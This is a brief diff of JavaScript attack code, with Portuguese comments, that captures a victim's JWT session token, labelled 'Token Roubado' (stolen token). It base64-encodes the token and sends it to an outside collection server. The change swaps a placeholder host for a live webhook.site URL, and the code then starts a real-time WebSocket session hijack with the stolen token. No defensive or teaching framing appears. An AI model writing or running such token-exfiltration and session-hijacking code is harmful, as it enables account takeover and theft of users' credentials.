@@ -8,7 +8,7 @@
             console.log("Token Roubado: ", data.token.jwt);
             
             // 2. Envia para o seu servidor de coleta (Burp Collaborator)
-            fetch("https://seu-servidor.com/collect?token=" + btoa(data.token.jwt));
+            fetch("https://webhook.site/5cd45eaf-7257-4100-8719-2810a7bd6022/collect?token=" + btoa(data.token.jwt));
 
             // 3. AGORA O TEMPERO: Inicia o sequestro do WebSocket em tempo real
             start_websocket_hijack(data.token.jwt);
